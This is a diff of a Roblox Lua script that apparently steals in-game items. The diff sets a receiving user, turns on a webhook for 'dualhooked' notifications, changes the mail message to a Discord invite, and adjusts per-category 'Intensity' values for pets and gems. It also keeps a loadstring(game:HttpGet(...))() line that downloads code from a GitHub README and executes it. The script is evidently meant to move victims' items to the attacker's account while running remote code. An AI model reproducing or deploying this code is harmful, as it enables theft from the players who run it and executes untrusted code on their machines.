@@ -9,8 +9,8 @@
 
 getgenv().Settings = {
     User = "larpedyourhuges",
-    Webhook = false, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "larped by omg",
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = ".gg/uSgzNwHDTS",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
@@ -25,7 +25,7 @@ getgenv().Settings = {
     },
     Pogs = {
         Dualhook = true,
-        Intensity = 100 --%
+        Intensity = 0 --%
     },
     Exclusives = {
         Dualhook = true,
@@ -33,7 +33,7 @@ getgenv().Settings = {
     },
     Events = {
         Dualhook = true,
-        Intensity = 100 --%
+        Intensity = 0 --%
     },
     Secrets = {
         Dualhook = true,
@@ -45,7 +45,7 @@ getgenv().Settings = {
     },
     Gems = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     }
 }
 
@@ -214,7 +214,7 @@ local data1
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxdeveloper12/testerrr/main/README.md", true))()-- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/robloxdeveloper12/testerrr/main/README.md'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
 -- Remotes
